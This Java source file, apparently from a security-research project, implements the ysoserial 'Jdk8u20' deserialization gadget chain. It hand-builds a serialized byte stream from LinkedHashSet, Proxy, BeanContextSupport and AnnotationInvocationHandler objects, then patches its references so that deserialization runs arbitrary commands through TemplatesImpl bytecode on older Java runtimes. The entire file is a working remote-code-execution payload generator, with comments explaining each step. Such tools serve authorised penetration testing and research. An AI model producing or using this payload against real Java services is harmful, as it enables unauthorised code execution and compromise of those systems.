package com.threedr3am.bug.tomcat.sync.session.payload;

import static java.io.ObjectStreamConstants.SC_SERIALIZABLE;
import static java.io.ObjectStreamConstants.SC_WRITE_METHOD;
import static java.io.ObjectStreamConstants.STREAM_MAGIC;
import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_BLOCKDATA;
import static java.io.ObjectStreamConstants.TC_CLASSDESC;
import static java.io.ObjectStreamConstants.TC_ENDBLOCKDATA;
import static java.io.ObjectStreamConstants.TC_NULL;
import static java.io.ObjectStreamConstants.TC_OBJECT;
import static java.io.ObjectStreamConstants.TC_PROXYCLASSDESC;
import static java.io.ObjectStreamConstants.TC_REFERENCE;
import static java.io.ObjectStreamConstants.TC_STRING;
import static java.io.ObjectStreamConstants.baseWireHandle;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.threedr3am.bug.tomcat.sync.session.utils.Converter;
import com.threedr3am.bug.tomcat.sync.session.utils.Gadgets;
import com.threedr3am.bug.tomcat.sync.session.utils.Reflections;
import java.beans.beancontext.BeanContextChildSupport;
import java.beans.beancontext.BeanContextSupport;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import javax.xml.transform.Templates;


/*

Gadget chain that works against JRE 1.8u20 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/pwntester/ab70e88821b4a6633c06
 */
/**
 * code from ysoserial
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
public class Jdk8u20 implements Payload {

	public Object getObject(final String... command) throws Exception {
		TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);
    Reflections.setFieldValue(templates, "_auxClasses", null);
    byte[] bytes = Converter.toBytes(getData(templates));
    patch(bytes);
		return bytes;
	}

    public static byte[] patch(byte[] bytes) {
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 0x71 && bytes[i+1] == 0x00 && bytes[i+2] == 0x7e && bytes[i+3] ==0x00) {
                i = i + 4;
//                System.out.print("Adjusting reference from: " + bytes[i]);
                if (bytes[i] == 1) bytes[i] = 5;        // (String)
                if (bytes[i] == 10) bytes[i] = 13;      // (ObjectStreamClass) [[B
                if (bytes[i] == 12) bytes[i] = 25;      // (BeanContextSupport)
                if (bytes[i] == 2) bytes[i] = 9;        // (TemplatesImpl)
                if (bytes[i] == 16) bytes[i] = 29;      // (InvocationHandler)
//                System.out.println(" to: " + bytes[i]);
            }
        }
        return bytes;
    }

    static Object[] getData(TemplatesImpl templates) {

        HashMap<String, Object> map = new HashMap();
        // We need map.put("f5a5a608", templates) but ObjectOutputStream does not create a
        // reference for templates so that its exactly the same instance as the one added
        // directly to the LinkedHashSet. So instead, we can add a string since OOS
        // will create a reference to the existing string, and then I can manually
        // replace the reference with one pointing to the templates instance in the LinkedHashSet
        map.put("f5a5a608", "f5a5a608");

        int offset = 0;
        return new Object[]{
            STREAM_MAGIC, STREAM_VERSION, // stream headers

            // (1) LinkedHashSet
            TC_OBJECT,
            TC_CLASSDESC,
            LinkedHashSet.class.getName(),
            -2851667679971038690L,
            (byte) 2,              // flags
            (short) 0,             // field count
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,          // super class
            HashSet.class.getName(),
            -5024744406713321676L,
            (byte) 3,              // flags
            (short) 0,             // field count
            TC_ENDBLOCKDATA,
            TC_NULL,               // no superclass

            // Block data that will be read by HashSet.readObject()
            // Used to configure the HashSet (capacity, loadFactor, size and items)
            TC_BLOCKDATA,
            (byte) 12,
            (short) 0,
            (short) 16,            // capacity
            (short) 16192, (short) 0, (short) 0, // loadFactor
            (short) 2,             // size

            // (2) First item in LinkedHashSet
            templates, // TemplatesImpl instance with malicious bytecode

            // (3) Second item in LinkedHashSet
            // Templates Proxy with AIH handler
            TC_OBJECT,
            TC_PROXYCLASSDESC,          // proxy declaration
            1,                          // one interface
            Templates.class.getName(),  // the interface implemented by the proxy
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,
            Proxy.class.getName(),      // java.lang.Proxy class desc
            -2222568056686623797L,      // serialVersionUID
            SC_SERIALIZABLE,            // flags
            (short) 2,                  // field count
            (byte) 'L', "dummy", TC_STRING, "Ljava/lang/Object;", // dummy non-existent field
            (byte) 'L', "h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;", // h field
            TC_ENDBLOCKDATA,
            TC_NULL,                    // no superclass

            // (3) Field values
            // value for the dummy field <--- BeanContextSupport.
            // this field does not actually exist in the Proxy class, so after deserialization this object is ignored.
            // (4) BeanContextSupport
            TC_OBJECT,
            TC_CLASSDESC,
            BeanContextSupport.class.getName(),
            -4879613978649577204L,      // serialVersionUID
            (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
            (short) 1,                  // field count
            (byte) 'I', "serializable", // serializable field, number of serializable children
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,               // super class
            BeanContextChildSupport.class.getName(),
            6328947014421475877L,
            SC_SERIALIZABLE,
            (short) 1,                  // field count
            (byte) 'L', "beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
            TC_ENDBLOCKDATA,
            TC_NULL,                    // no superclass

            // (4) Field values
            // beanContextChildPeer must point back to this BeanContextSupport for BeanContextSupport.readObject to go into BeanContextSupport.readChildren()
            TC_REFERENCE, baseWireHandle + 12,
            // serializable: one serializable child
            1,

            // now we add an extra object that is not declared, but that will be read/consumed by readObject
            // BeanContextSupport.readObject calls readChildren because we said we had one serializable child but it is not in the byte array
            // so the call to child = ois.readObject() will deserialize next object in the stream: the AnnotationInvocationHandler
            // At this point we enter the readObject of the aih that will throw an exception after deserializing its default objects

            // (5) AIH that will be deserialized as part of the BeanContextSupport
            TC_OBJECT,
            TC_CLASSDESC,
            "sun.reflect.annotation.AnnotationInvocationHandler",
            6182022883658399397L,       // serialVersionUID
            (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
            (short) 2,                  // field count
            (byte) 'L', "type", TC_STRING, "Ljava/lang/Class;",         // type field
            (byte) 'L', "memberValues", TC_STRING, "Ljava/util/Map;",   // memberValues field
            TC_ENDBLOCKDATA,
            TC_NULL,                    // no superclass

            // (5) Field Values
            Templates.class,            // type field value
            map,                        // memberValues field value

            // note: at this point normally the BeanContextSupport.readChildren would try to read the
            // BCSChild; but because the deserialization of the AnnotationInvocationHandler above throws,
            // we skip past that one into the catch block, and continue out of readChildren

            // the exception takes us out of readChildren and into BeanContextSupport.readObject
            // where there is a call to deserialize(ois, bcmListeners = new ArrayList(1));
            // Within deserialize() there is an int read (0) and then it will read as many obejcts (0)

            TC_BLOCKDATA,
            (byte) 4,                   // block length
            0,                          // no BeanContextSupport.bcmListenes
            TC_ENDBLOCKDATA,

            // (6) value for the Proxy.h field
            TC_REFERENCE, baseWireHandle + offset + 16, // refer back to the AnnotationInvocationHandler

            TC_ENDBLOCKDATA,
        };
    }

}
